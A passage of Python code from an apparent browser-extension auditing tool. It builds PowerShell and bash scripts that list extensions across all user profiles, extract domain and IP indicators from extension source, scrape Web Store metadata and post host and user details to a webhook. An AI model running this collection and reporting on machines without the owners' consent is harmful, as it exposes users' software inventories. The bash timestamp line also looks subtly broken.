    foreach ($prefsFile in @("Preferences", "Secure Preferences")) {
        $prefsPath = Join-Path $ProfilePath $prefsFile
        if (-not (Test-Path $prefsPath)) { continue }

        try {
            $prefsJson = Get-Content $prefsPath -Raw -ErrorAction Stop | ConvertFrom-Json
            if ($prefsJson.extensions -and $prefsJson.extensions.settings) {
                $prefsJson.extensions.settings.PSObject.Properties | ForEach-Object {
                    $settings[$_.Name] = $_.Value
                }
                break
            }
        } catch {}
    }
    return $settings
}

function List-ChromiumExtensions {
    param([string]$Browser, [string]$BasePath)
    if (-not (Test-Path $BasePath)) { return }

    Write-Host "--- $Browser ---" -ForegroundColor Yellow

    $profiles = @("Default") + @(Get-ChildItem -Path $BasePath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)

    foreach ($profileName in $profiles) {
        $profilePath = Join-Path $BasePath $profileName
        if (-not (Test-Path $profilePath)) { continue }
        $extPath = Join-Path $profilePath "Extensions"

        $prefs = Get-ExtensionSettings -ProfilePath $profilePath

        Write-Host "  Profile: $profileName" -ForegroundColor Gray

        $foundIds = @{}

        if (Test-Path $extPath) {
            $extDirs = Get-ChildItem -Path $extPath -Directory -ErrorAction SilentlyContinue
            foreach ($ext in $extDirs) {
                $extId = $ext.Name
                if ($extId -eq "Temp") { continue }
                $foundIds[$extId] = $true

                $info = Get-ManifestInfo -ExtDir $ext.FullName
                $name = if ($info.Name) { $info.Name } else { $extId }
                $version = $info.Version

                # Last-resort: cached name from Preferences if still unresolved
                if ($name -match "^__MSG_") {
                    try {
                        if ($prefs.ContainsKey($extId)) {
                            $cachedName = $prefs[$extId].manifest.name
                            if ($cachedName -and $cachedName -notmatch "^__MSG_") { $name = $cachedName }
                        }
                    } catch {}
                }

                $tag = ""
                try {
                    if ($prefs.ContainsKey($extId)) {
                        $loc = $prefs[$extId].location
                        if ($loc -eq 4) { $tag = "[UNPACKED]" }
                        if ($loc -eq 5) { $tag = "[COMPONENT]" }
                    }
                } catch {}

                Write-Host ("    {0,-45} {1,-35} v{2,-12} {3}" -f $name, $extId, $version, $tag)
            }
        }

        # Second pass: extensions registered in Preferences but not on disk
        # (policy-installed, external, or extensions with non-standard paths)
        $keyCopy = @($prefs.Keys)
        foreach ($extId in $keyCopy) {
            if ($foundIds.ContainsKey($extId)) { continue }

            try {
                $extInfo = $prefs[$extId]
                if (-not $extInfo) { continue }

                $loc = $null
                try { $loc = [int]$extInfo.location } catch { continue }
                # Skip internal Chrome builtins (location 1) only
                if ($loc -eq 1) { continue }

                # Try to get name: from manifest on disk (custom path) first, then cached manifest
                $name = $extId
                $version = "?"
                $tag = ""

                $extDir = $null
                try { $extDir = [string]$extInfo.path } catch {}
                if ($extDir) {
                    if (-not [System.IO.Path]::IsPathRooted($extDir)) {
                        $extDir = Join-Path $profilePath $extDir
                    }
                    if (Test-Path $extDir) {
                        $info = Get-ManifestInfo -ExtDir $extDir
                        if ($info.Name) { $name = $info.Name }
                        $version = $info.Version
                    }
                }

                # Fall back to Preferences cached manifest name
                if ($name -eq $extId -or $name -match "^__MSG_") {
                    try {
                        $cn = $extInfo.manifest.name
                        if ($cn -and $cn -notmatch "^__MSG_") { $name = $cn }
                        $cv = $extInfo.manifest.version
                        if ($cv -and $version -eq "?") { $version = $cv }
                    } catch {}
                }

                if ($loc -eq 4) { $tag = "[UNPACKED]" }
                elseif ($loc -eq 5) { $tag = "[COMPONENT]" }
                elseif ($loc -eq 3 -or $loc -eq 8) { $tag = "[POLICY]" }

                $color = if ($loc -eq 4) { "Green" } elseif ($loc -eq 8) { "Red" } else { "White" }
                Write-Host ("    {0,-45} {1,-35} v{2,-12} {3}" -f $name, $extId, $version, $tag) -ForegroundColor $color
            } catch {
                continue
            }
        }
    }
    Write-Host ""
}

# Discover all user profile directories
$userDirs = @()
$usersRoot = Join-Path $env:SystemDrive "Users"
if (Test-Path $usersRoot) {
    Get-ChildItem -Path $usersRoot -Directory -ErrorAction SilentlyContinue | ForEach-Object {
        $localAppData = Join-Path $_.FullName "AppData\Local"
        if (Test-Path $localAppData) {
            $userDirs += $_.FullName
        }
    }
}
# Ensure current user is covered (fallback)
if ($env:USERPROFILE -and (Test-Path $env:USERPROFILE)) {
    $resolved = (Resolve-Path $env:USERPROFILE).Path
    if ($userDirs -notcontains $resolved) {
        $userDirs += $resolved
    }
}

Write-Host "`n===== INSTALLED BROWSER EXTENSIONS =====" -ForegroundColor Cyan
Write-Host ""

$foundAny = $false

foreach ($userDir in $userDirs) {
    $userName = Split-Path $userDir -Leaf
    $localAppData = Join-Path $userDir "AppData\Local"
    $appData = Join-Path $userDir "AppData\Roaming"
    
    $browserPaths = @{
        "Chrome" = Join-Path $localAppData "Google\Chrome\User Data"
        "Edge"   = Join-Path $localAppData "Microsoft\Edge\User Data"
        "Brave"  = Join-Path $localAppData "BraveSoftware\Brave-Browser\User Data"
    }
    
    $hasBrowser = $false
    foreach ($bp in $browserPaths.Values) {
        if (Test-Path $bp) { $hasBrowser = $true; break }
    }
    if (-not $hasBrowser) { continue }
    
    $foundAny = $true
    Write-Host "===[ User: $userName ]===" -ForegroundColor Magenta
    Write-Host ""
    
    foreach ($browser in $browserPaths.Keys) {
        List-ChromiumExtensions -Browser $browser -BasePath $browserPaths[$browser]
    }
}

if (-not $foundAny) {
    Write-Host "  No browser data found in any user profile." -ForegroundColor Gray
    Write-Host ""
}

Write-Host "===== END OF EXTENSION LIST =====" -ForegroundColor Cyan
'''

        # Inject the IOC extraction function into the base script when enabled
        if extract_iocs:
            script = script.replace(
                '# Discover all user profile directories',
                r'''function Extract-NetworkIOCs {
    param([string]$ExtDir)
    $iocs = @{}
    $targetDir = $ExtDir
    $vDirs = Get-ChildItem -Path $ExtDir -Directory -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match '^\d' } | Sort-Object Name -Descending
    if ($vDirs) { $targetDir = $vDirs[0].FullName }
    $skip = @("w3.org","schema.org","github.com","chromium.org")
    $noiseIp = @("0.0.0.0","127.0.0.1","255.255.255.255","255.255.255.0")
    $domRx = 'https?://(?:www\.)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,8})'
    $ipRx = '(?:https?://|["''/=@])(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?:[:/\s"'',;\)\]#?]|$)'
    foreach ($jsFile in (Get-ChildItem -Path $targetDir -Filter "*.js" -Recurse -File -ErrorAction SilentlyContinue)) {
        try {
            $raw = [System.IO.File]::ReadAllBytes($jsFile.FullName)
            $len = [Math]::Min($raw.Length, 1048576)
            $content = [System.Text.Encoding]::UTF8.GetString($raw, 0, $len)
            foreach ($dm in [regex]::Matches($content, $domRx)) {
                $d = $dm.Groups[1].Value
                if ($skip -contains $d) { continue }
                if (-not $iocs.ContainsKey($d)) { $iocs[$d] = @() }
                if ($iocs[$d] -notcontains $jsFile.Name) { $iocs[$d] += $jsFile.Name }
            }
            foreach ($im in [regex]::Matches($content, $ipRx)) {
                $ip = $im.Groups[1].Value
                if ($noiseIp -contains $ip) { continue }
                $parts = $ip.Split('.')
                $ok = $true
                foreach ($p in $parts) {
                    $v = 0; if (-not [int]::TryParse($p, [ref]$v)) { $ok = $false; break }
                    if ($v -gt 254 -or ($p.Length -gt 1 -and $p[0] -eq [char]'0')) { $ok = $false; break }
                }
                if ([int]$parts[0] -eq 0) { $ok = $false }
                if (-not $ok) { continue }
                if (-not $iocs.ContainsKey($ip)) { $iocs[$ip] = @() }
                if ($iocs[$ip] -notcontains $jsFile.Name) { $iocs[$ip] += $jsFile.Name }
            }
            foreach ($b64 in [regex]::Matches($content, '(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?')) {
                try {
                    $dec = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64.Value))
                    foreach ($hd in [regex]::Matches($dec, $domRx)) {
                        $d = $hd.Groups[1].Value
                        if ($skip -contains $d) { continue }
                        if (-not $iocs.ContainsKey($d)) { $iocs[$d] = @() }
                        $lbl = "$($jsFile.Name) (Base64)"
                        if ($iocs[$d] -notcontains $lbl) { $iocs[$d] += $lbl }
                    }
                    foreach ($hi in [regex]::Matches($dec, $ipRx)) {
                        $ip = $hi.Groups[1].Value
                        if ($noiseIp -contains $ip) { continue }
                        if (-not $iocs.ContainsKey($ip)) { $iocs[$ip] = @() }
                        $lbl = "$($jsFile.Name) (Base64)"
                        if ($iocs[$ip] -notcontains $lbl) { $iocs[$ip] += $lbl }
                    }
                } catch {}
            }
        } catch {}
    }
    return $iocs
}

# Discover all user profile directories''')

        # Build the IOC extraction block for webhook mode
        ioc_block = ""
        if extract_iocs:
            ioc_block = r'''
# --- Network IOC Extraction (for webhook payload) ---
Write-Host "`n=== Extracting Network IOCs from extension source code... ==="
$extPathCache = @{}
foreach ($ext in $allExts) {
    if ($extPathCache.ContainsKey($ext.id)) { continue }
    $userBase = Join-Path (Join-Path $env:SystemDrive "Users") $ext.user
    $lad = Join-Path $userBase "AppData\Local"
    $bMap = @{
        "Chrome" = Join-Path $lad "Google\Chrome\User Data"
        "Edge"   = Join-Path $lad "Microsoft\Edge\User Data"
        "Brave"  = Join-Path $lad "BraveSoftware\Brave-Browser\User Data"
    }
    if ($bMap.ContainsKey($ext.browser)) {
        $edir = Join-Path (Join-Path (Join-Path $bMap[$ext.browser] $ext.profile) "Extensions") $ext.id
        if (Test-Path $edir) { $extPathCache[$ext.id] = $edir }
    }
}
$iocResults = @{}
$uidList = @($extPathCache.Keys)
$iocIdx = 0
foreach ($uid in $uidList) {
    $iocIdx++
    Write-Host "  [$iocIdx/$($uidList.Count)] Scanning $uid..." -NoNewline
    $result = Extract-NetworkIOCs -ExtDir $extPathCache[$uid]
    if ($result -and $result.Count -gt 0) {
        $iocResults[$uid] = $result
        Write-Host " $($result.Count) IOC(s)"
    } else {
        Write-Host " clean"
    }
}
foreach ($ext in $allExts) {
    if ($iocResults.ContainsKey($ext.id)) {
        $iocMap = $iocResults[$ext.id]
        $iocArr = @()
        foreach ($key in $iocMap.Keys) {
            $iocArr += @{ indicator = $key; sources = $iocMap[$key] }
        }
        $ext["network_iocs"] = $iocArr
        $ext["network_iocs_count"] = $iocArr.Count
    }
}
$totalIocs = 0
foreach ($r in $iocResults.Values) { $totalIocs += $r.Count }
Write-Host "Extracted $totalIocs unique IOC(s) from $($iocResults.Count) extension(s).`n"
'''

        # Build the enrichment block (shared between webhook and standalone modes)
        enrich_block = ""
        if enrich_metadata:
            enrich_block = r'''
# --- Web Store Metadata Enrichment ---
Write-Host "`n=== Fetching Chrome Web Store metadata... ==="
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$headers = @{
    "User-Agent"      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
    "Accept-Language"  = "en-US,en;q=0.9"
}
$uniqueIds = $allExts | ForEach-Object { $_.id } | Sort-Object -Unique
$metaCache = @{}
$idx = 0
foreach ($uid in $uniqueIds) {
    $idx++
    try {
        $url = "https://chromewebstore.google.com/detail/$uid"
        Write-Host "  [$idx/$($uniqueIds.Count)] Fetching $uid..." -NoNewline
        $resp = Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 12 -Headers $headers -ErrorAction Stop
        if ($resp.StatusCode -eq 200) {
            $html = $resp.Content
            $m = @{ store_url = $url }
            if ($html -match '>([\d,]+)\+?\s*users<') {
                $m["users_display"] = $Matches[1].Trim() + " users"
                $m["users"] = [int]($Matches[1] -replace ',','')
            }
            if ($html -match '(\d(?:\.\d)?)\s*out of\s*5') {
                $m["rating"] = $Matches[1]
            }
            if ($html -match '>([\d,.]+[KMkm]?)\s*ratings?<') {
                $m["rating_count"] = $Matches[1].Trim()
            }
            if ($html -match '>Featured<') {
                $m["featured"] = $true
            }
            $metaCache[$uid] = $m
            $info = if ($m.users_display) { $m.users_display } else { "no data" }
            $rat  = if ($m.rating) { "Rating: $($m.rating)/5" } else { "" }
            $feat = if ($m.featured) { " [Featured]" } else { "" }
            Write-Host " $info | $rat$feat"
        } else {
            Write-Host " HTTP $($resp.StatusCode)"
        }
    } catch {
        Write-Host " SKIP ($($_.Exception.Message))"
    }
}
foreach ($ext in $allExts) {
    if ($metaCache.ContainsKey($ext.id)) {
        $ext["webstore"] = $metaCache[$ext.id]
    }
}
Write-Host "Enriched $($metaCache.Count) of $($uniqueIds.Count) unique extensions with Web Store data.`n"
'''

        if wh_val:
            script = script.replace(
                '# Extension Lister - Run in PowerShell on target Windows machine',
                '''# Extension Lister - Run in PowerShell on target Windows machine
# Webhook: sends extension list results to configured URL

$WebhookUrl = "{WEBHOOK_URL}"

function Send-Webhook {{
    param([hashtable]$Data)
    if (-not $WebhookUrl) {{ return }}
    try {{
        $body = $Data | ConvertTo-Json -Compress -Depth 5
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 -ErrorAction SilentlyContinue | Out-Null
    }} catch {{}}
}}'''.format(WEBHOOK_URL=wh_val))
            script = script.replace(
                'Write-Host "===== END OF EXTENSION LIST =====" -ForegroundColor Cyan',
                r'''Write-Host "===== END OF EXTENSION LIST =====" -ForegroundColor Cyan

# --- Collect all extensions into an array for webhook ---
$allExts = @()
foreach ($userDir in $userDirs) {
    $userName = Split-Path $userDir -Leaf
    $localAppData = Join-Path $userDir "AppData\Local"
    $appData     = Join-Path $userDir "AppData\Roaming"
    $browserPaths = @{
        "Chrome" = Join-Path $localAppData "Google\Chrome\User Data"
        "Edge"   = Join-Path $localAppData "Microsoft\Edge\User Data"
        "Brave"  = Join-Path $localAppData "BraveSoftware\Brave-Browser\User Data"
    }
    foreach ($browser in $browserPaths.Keys) {
        $bp = $browserPaths[$browser]
        if (-not (Test-Path $bp)) { continue }
        $profiles2 = @("Default") + @(Get-ChildItem -Path $bp -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
        foreach ($pn in $profiles2) {
            $profilePath2 = Join-Path $bp $pn
            if (-not (Test-Path $profilePath2)) { continue }
            $ep = Join-Path $profilePath2 "Extensions"
            if (-not (Test-Path $ep)) { continue }
            $prefs2 = Get-ExtensionSettings -ProfilePath $profilePath2
            foreach ($extDir2 in (Get-ChildItem -Path $ep -Directory -ErrorAction SilentlyContinue)) {
                if ($extDir2.Name -eq "Temp") { continue }
                $extId2 = $extDir2.Name
                $mi2 = Get-ManifestInfo -ExtDir $extDir2.FullName
                $ename = if ($mi2.Name) { $mi2.Name } else { $extId2 }
                # Resolve __MSG_ via _locales
                if ($ename -match "^__MSG_") {
                    $msgKey = $ename -replace "^__MSG_","" -replace "__$",""
                    $localeSearchDirs = @("en","en_US","en_GB")
                    foreach ($loc in $localeSearchDirs) {
                        $mFile = $null
                        # Search in version subdirs
                        $vDirs2 = Get-ChildItem -Path $extDir2.FullName -Directory -ErrorAction SilentlyContinue | Sort-Object Name -Descending
                        foreach ($vd in $vDirs2) {
                            $mFile = Join-Path $vd.FullName "_locales\$loc\messages.json"
                            if (Test-Path $mFile) { break } else { $mFile = $null }
                        }
                        if ($mFile -and (Test-Path $mFile)) {
                            try {
                                $msgs = Get-Content $mFile -Raw | ConvertFrom-Json
                                $resolved = $msgs.$msgKey.message
                                if ($resolved) { $ename = $resolved; break }
                            } catch {}
                        }
                    }
                    # Fallback to Preferences cached name
                    if ($ename -match "^__MSG_" -and $prefs2.ContainsKey($extId2)) {
                        try {
                            $cn = $prefs2[$extId2].manifest.name
                            if ($cn -and $cn -notmatch "^__MSG_") { $ename = $cn }
                        } catch {}
                    }
                }
                $allExts += @{ user=$userName; browser=$browser; profile=$pn; id=$extId2; name=$ename; version=$mi2.Version }
            }
        }
    }
}
''' + ioc_block + enrich_block + r'''
Send-Webhook @{
    event            = "remedex_extension_list"
    host             = $env:COMPUTERNAME
    user             = $env:USERNAME
    timestamp        = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    os               = [System.Environment]::OSVersion.VersionString
    extensions_count = $allExts.Count
    extensions       = $allExts
}''')

            # Increase JSON serialization depth when IOCs add nested arrays
            if extract_iocs:
                script = script.replace(
                    'ConvertTo-Json -Compress -Depth 5',
                    'ConvertTo-Json -Compress -Depth 10')

        # Standalone IOC display for non-webhook mode
        if extract_iocs and not wh_val:
            script += r'''

# --- Network IOC Extraction (standalone display) ---
Write-Host "`n===== NETWORK IOC EXTRACTION =====" -ForegroundColor Cyan
$scannedIds = @{}
$totalIocCount = 0
foreach ($userDir in $userDirs) {
    $userName = Split-Path $userDir -Leaf
    $localAppData = Join-Path $userDir "AppData\Local"
    $bpScan = @{
        "Chrome" = Join-Path $localAppData "Google\Chrome\User Data"
        "Edge"   = Join-Path $localAppData "Microsoft\Edge\User Data"
        "Brave"  = Join-Path $localAppData "BraveSoftware\Brave-Browser\User Data"
    }
    foreach ($browser in $bpScan.Keys) {
        $bpath = $bpScan[$browser]
        if (-not (Test-Path $bpath)) { continue }
        $profs = @("Default") + @(Get-ChildItem -Path $bpath -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name)
        foreach ($pn in $profs) {
            $ep = Join-Path (Join-Path $bpath $pn) "Extensions"
            if (-not (Test-Path $ep)) { continue }
            foreach ($ed in (Get-ChildItem -Path $ep -Directory -ErrorAction SilentlyContinue)) {
                if ($ed.Name -eq "Temp" -or $scannedIds.ContainsKey($ed.Name)) { continue }
                $scannedIds[$ed.Name] = $true
                $iocResult = Extract-NetworkIOCs -ExtDir $ed.FullName
                if ($iocResult -and $iocResult.Count -gt 0) {
                    $mi = Get-ManifestInfo -ExtDir $ed.FullName
                    $dname = if ($mi.Name) { $mi.Name } else { $ed.Name }
                    Write-Host "  $dname ($($ed.Name)) - $($iocResult.Count) IOC(s):" -ForegroundColor Yellow
                    foreach ($key in $iocResult.Keys) {
                        $srcList = $iocResult[$key] -join ", "
                        Write-Host "    $key  [$srcList]"
                    }
                    $totalIocCount += $iocResult.Count
                }
            }
        }
    }
}
if ($totalIocCount -eq 0) {
    Write-Host "  No network IOCs found." -ForegroundColor Gray
}
Write-Host "===== END OF IOC EXTRACTION ($totalIocCount unique IOCs) =====" -ForegroundColor Cyan
'''

        script += "\n"
        return script

    def _generate_bash_lister_script(self, target_os: str, webhook_url: str = "",
                                     enrich_metadata: bool = False, extract_iocs: bool = False) -> str:
        wh_val = webhook_url if webhook_url else ""
        if target_os == "mac":
            homes_glob = "/Users/*/"
            lib_check = "Library"
            chrome_sub = "Library/Application Support/Google/Chrome"
            edge_sub = "Library/Application Support/Microsoft Edge"
            brave_sub = "Library/Application Support/BraveSoftware/Brave-Browser"
        else:
            homes_glob = "/home/*/"
            lib_check = ".config"
            chrome_sub = ".config/google-chrome"
            edge_sub = ".config/microsoft-edge"
            brave_sub = ".config/BraveSoftware/Brave-Browser"
        
        script = f'''#!/bin/bash
# Extension Lister - Run on target {"macOS" if target_os == "mac" else "Linux"} machine
# Lists all browser extensions with Name, ID, Version, Status
# Includes unpacked/developer-mode extensions loaded from custom paths
# Works when run as root, via sudo, or as a regular user

# Discover all user home directories to scan
discover_home_dirs() {{
    local -a dirs=()
    local seen=""
    for d in {homes_glob}; do
        [[ -d "${{d}}{lib_check}" ]] || continue
        local real=$(cd "$d" 2>/dev/null && pwd -P)
        [[ -n "$real" ]] || continue
        case "$seen" in *"|$real|"*) continue ;; esac
        seen="$seen|$real|"
        dirs+=("$real")
    done
    if [[ -n "$HOME" ]] && [[ -d "$HOME" ]]; then
        local real_home=$(cd "$HOME" 2>/dev/null && pwd -P)
        case "$seen" in *"|$real_home|"*) ;; *)
            dirs+=("$real_home")
        ;; esac
    fi
    printf '%s\\n' "${{dirs[@]}}"
}}

# Helper: read name & version from a manifest dir (checks direct + version subdirs)
get_manifest_info() {{
    local dir="$1"
    local fallback_id="$2"
    local manifest=""
    
    [[ -f "$dir/manifest.json" ]] && manifest="$dir/manifest.json"
    
    if [[ -z "$manifest" ]]; then
        for ver_dir in "$dir"/*/; do
            [[ -f "$ver_dir/manifest.json" ]] && manifest="$ver_dir/manifest.json"
        done
    fi
    
    if [[ -n "$manifest" ]] && command -v python3 &>/dev/null; then
        python3 -c "
import json
try:
    m = json.load(open('$manifest'))
    print(m.get('name','$fallback_id') + '|||' + m.get('version','?'))
except: print('$fallback_id|||?')
" 2>/dev/null
    elif [[ -n "$manifest" ]]; then
        local n=$(sed -n 's/.*"name"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p' "$manifest" 2>/dev/null | head -1)
        local v=$(sed -n 's/.*"version"[[:space:]]*:[[:space:]]*"\\([^"]*\\)".*/\\1/p' "$manifest" 2>/dev/null | head -1)
        echo "${{n:-$fallback_id}}|||${{v:-?}}"
    else
        echo "$fallback_id|||?"
    fi
}}

list_chromium_extensions() {{
    local browser="$1"
    local base_path="$2"
    
    [[ ! -d "$base_path" ]] && return
    
    echo "--- $browser ---"
    
    for profile_dir in "$base_path/Default" "$base_path"/Profile\\ *; do
        [[ ! -d "$profile_dir" ]] && continue
        local profile_name=$(basename "$profile_dir")
        local ext_path="$profile_dir/Extensions"
        
        local prefs_file=""
        for pf in "$profile_dir/Secure Preferences" "$profile_dir/Preferences"; do
            [[ -f "$pf" ]] && prefs_file="$pf" && break
        done
        
        echo "  Profile: $profile_name"
        
        local found_ids=""
        
        if [[ -d "$ext_path" ]]; then
            for ext_dir in "$ext_path"/*/; do
                [[ ! -d "$ext_dir" ]] && continue
                local ext_id=$(basename "$ext_dir")
                [[ "$ext_id" == "Temp" ]] && continue
                found_ids="$found_ids $ext_id"
                
                local parsed=$(get_manifest_info "$ext_dir" "$ext_id")
                local name="${{parsed%%|||*}}"
                local version="${{parsed##*|||}}"
                local tag=""
                
                if [[ -n "$prefs_file" ]] && command -v python3 &>/dev/null; then
                    local ext_info=$(python3 -c "
import json
try:
    p = json.load(open('$prefs_file'))
    s = p.get('extensions',{{}}).get('settings',{{}}).get('$ext_id',{{}})
    name = s.get('manifest',{{}}).get('name','')
    loc = s.get('location', 0)
    tag = ''
    if loc == 4: tag = '[UNPACKED]'
    if loc == 5: tag = '[COMPONENT]'
    print(f'{{name}}|||{{tag}}')
except: print('|||')
" 2>/dev/null)
                    local cached_name="${{ext_info%%|||*}}"
                    local cached_tag="${{ext_info##*|||}}"
                    if [[ "$name" == __MSG_* ]] && [[ -n "$cached_name" ]] && [[ "$cached_name" != __MSG_* ]]; then
                        name="$cached_name"
                    fi
                    [[ -n "$cached_tag" ]] && tag="$cached_tag"
                fi
                
                printf "    %-45s %-35s v%-12s %s\\n" "$name" "$ext_id" "$version" "$tag"
            done
        fi
        
        if [[ -n "$prefs_file" ]] && command -v python3 &>/dev/null; then
            python3 -c "
import json, os
settings = {{}}
for pf in ['$profile_dir/Secure Preferences', '$profile_dir/Preferences']:
    if not os.path.isfile(pf):
        continue
    try:
        p = json.load(open(pf))
        s = p.get('extensions', {{}}).get('settings', {{}})
        if s:
            settings = s
            break
    except: continue

found = '$found_ids'.split()
for ext_id, info in settings.items():
    if ext_id in found:
        continue
    if not isinstance(info, dict):
        continue
    if info.get('location') != 4:
        continue
    ext_path = info.get('path', '')
    if not ext_path:
        continue
    if not os.path.isabs(ext_path):
        ext_path = os.path.join('$profile_dir', ext_path)
    name = ext_id
    version = '?'
    manifest_path = os.path.join(ext_path, 'manifest.json')
    if os.path.isfile(manifest_path):
        try:
            m = json.load(open(manifest_path))
            name = m.get('name', ext_id)
            version = m.get('version', '?')
        except: pass
    elif os.path.isdir(ext_path):
        for sub in sorted(os.listdir(ext_path)):
            mp = os.path.join(ext_path, sub, 'manifest.json')
            if os.path.isfile(mp):
                try:
                    m = json.load(open(mp))
                    name = m.get('name', ext_id)
                    version = m.get('version', '?')
                except: pass
                break
    if name.startswith('__MSG_'):
        cached = info.get('manifest', {{}}).get('name', '')
        if cached and not cached.startswith('__MSG_'):
            name = cached
    print(f'    {{name:<45}} {{ext_id:<35}} v{{version:<12}} [UNPACKED]')
" 2>/dev/null
        fi
    done
    echo ""
}}

echo ""
echo "===== INSTALLED BROWSER EXTENSIONS ====="
echo ""

found_any=false

OLD_IFS="$IFS"
IFS=$'\\n'
_home_dirs=($(discover_home_dirs))
IFS="$OLD_IFS"

for user_home in "${{_home_dirs[@]}}"; do
    [[ -z "$user_home" ]] && continue
    username=$(basename "$user_home")
    
    chrome_path="$user_home/{chrome_sub}"
    edge_path="$user_home/{edge_sub}"
    brave_path="$user_home/{brave_sub}"
    
    has_browser=false
    for bp in "$chrome_path" "$edge_path" "$brave_path"; do
        [[ -d "$bp" ]] && has_browser=true && break
    done
    $has_browser || continue
    
    found_any=true
    echo "===[ User: $username ]==="
    echo ""
    
    list_chromium_extensions "Chrome" "$chrome_path"
    list_chromium_extensions "Edge" "$edge_path"
    list_chromium_extensions "Brave" "$brave_path"
    
done

if ! $found_any; then
    echo "  No browser data found in any user home directory."
    echo ""
fi

echo "===== END OF EXTENSION LIST ====="
'''

        if enrich_metadata:
            script += f'''

# --- Web Store Metadata Enrichment ---
echo ""
echo "=== Fetching Chrome Web Store metadata... ==="
_ENRICHMENT_IDS=""
_OLD_IFS2="$IFS"; IFS=$'\\n'; _enrich_homes=($(discover_home_dirs)); IFS="$_OLD_IFS2"
for _eh in "${{_enrich_homes[@]}}"; do
    [[ -z "$_eh" ]] && continue
    for _bp in "$_eh/{chrome_sub}" "$_eh/{edge_sub}" "$_eh/{brave_sub}"; do
        [[ -d "$_bp" ]] || continue
        for _pd in "$_bp/Default" "$_bp"/Profile\\ *; do
            _ep="$_pd/Extensions"
            [[ -d "$_ep" ]] || continue
            for _ed in "$_ep"/*/; do
                _eid=$(basename "$_ed")
                [[ "${{#_eid}}" -eq 32 ]] && _ENRICHMENT_IDS="$_ENRICHMENT_IDS $_eid"
            done
        done
    done
done
_UNIQUE_IDS=$(echo "$_ENRICHMENT_IDS" | tr ' ' '\\n' | sort -u | grep -v '^$')
_total=$(echo "$_UNIQUE_IDS" | wc -l | tr -d ' ')
_idx=0
_enriched=0
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
for _uid in $_UNIQUE_IDS; do
    _idx=$((_idx + 1))
    _url="https://chromewebstore.google.com/detail/$_uid"
    printf "  [%d/%d] %s..." "$_idx" "$_total" "$_uid"
    _html=$(curl -s -L -A "$UA" -H "Accept-Language: en-US,en;q=0.9" --connect-timeout 8 --max-time 12 "$_url" 2>/dev/null)
    if [[ -n "$_html" ]]; then
        _users=$(echo "$_html" | grep -oE ">[0-9,]+\\+? users<" | head -1 | sed "s/[<>]//g")
        _rating=$(echo "$_html" | grep -oE "[0-9](\\.[0-9])? out of 5" | head -1 | sed "s/ out of 5//")
        _feat=""
        echo "$_html" | grep -q ">Featured<" && _feat=" [Featured]"
        if [[ -n "$_users" ]] || [[ -n "$_rating" ]]; then
            echo " ${{_users:-no data}} | Rating: ${{_rating:-N/A}}/5$_feat"
            _enriched=$((_enriched + 1))
        else
            echo " no public data"
        fi
    else
        echo " SKIP (could not fetch)"
    fi
done
echo "Enriched $_enriched of $_total unique extensions with Web Store data."
echo ""
'''

        if wh_val:
            script = f'''#!/bin/bash
# Extension Lister with webhook output
WEBHOOK_URL="{wh_val}"

send_webhook() {{
    [[ -z "$WEBHOOK_URL" ]] && return
    local payload="$1"
    curl -s -o /dev/null -X POST "$WEBHOOK_URL" \\
        -H "Content-Type: application/json" \\
        -d "$payload" \\
        --connect-timeout 10 2>/dev/null || true
}}

''' + script.split('\n', 5)[5]  # skip the original shebang + comments
            script = script.replace(
                'echo "===== END OF EXTENSION LIST ====="',
                f'''echo "===== END OF EXTENSION LIST ====="

# Send results to webhook
if [[ -n "$WEBHOOK_URL" ]]; then
    FULL_OUTPUT=""
    FULL_OUTPUT="${{FULL_OUTPUT}}\\n===== INSTALLED BROWSER EXTENSIONS =====\\n"
    found_any_wh=false
    _OLD_IFS="$IFS"; IFS=$'\\n'; _wh_homes=($(discover_home_dirs)); IFS="$_OLD_IFS"
    for user_home in "${{_wh_homes[@]}}"; do
        [[ -z "$user_home" ]] && continue
        username=$(basename "$user_home")
        chrome_path="$user_home/{chrome_sub}"
        edge_path="$user_home/{edge_sub}"
        brave_path="$user_home/{brave_sub}"
        has_browser=false
        for bp in "$chrome_path" "$edge_path" "$brave_path"; do
            [[ -d "$bp" ]] && has_browser=true && break
        done
        $has_browser || continue
        found_any_wh=true
        FULL_OUTPUT="${{FULL_OUTPUT}}===[ User: $username ]===\\n"
        FULL_OUTPUT="${{FULL_OUTPUT}}$(list_chromium_extensions "Chrome" "$chrome_path" 2>/dev/null)\\n"
        FULL_OUTPUT="${{FULL_OUTPUT}}$(list_chromium_extensions "Edge" "$edge_path" 2>/dev/null)\\n"
        FULL_OUTPUT="${{FULL_OUTPUT}}$(list_chromium_extensions "Brave" "$brave_path" 2>/dev/null)\\n"
    done
    if ! $found_any_wh; then
        FULL_OUTPUT="${{FULL_OUTPUT}}  No browser data found.\\n"
    fi
    FULL_OUTPUT="${{FULL_OUTPUT}}===== END OF EXTENSION LIST ====="
    ESCAPED_OUT=$(echo "$FULL_OUTPUT" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null || echo "\\"output unavailable\\"")
    WH_PAYLOAD="{{\\"event\\":\\"remedex_extension_list\\",\\"host\\":\\"$(hostname)\\",\\"user\\":\\"$(whoami)\\",\\"os\\":\\"$(uname -srm)\\",\\"timestamp\\":\\"$(date \'%Y-%m-%d %H:%M:%S\')\\",\\"output\\":$ESCAPED_OUT}}"
    send_webhook "$WH_PAYLOAD"
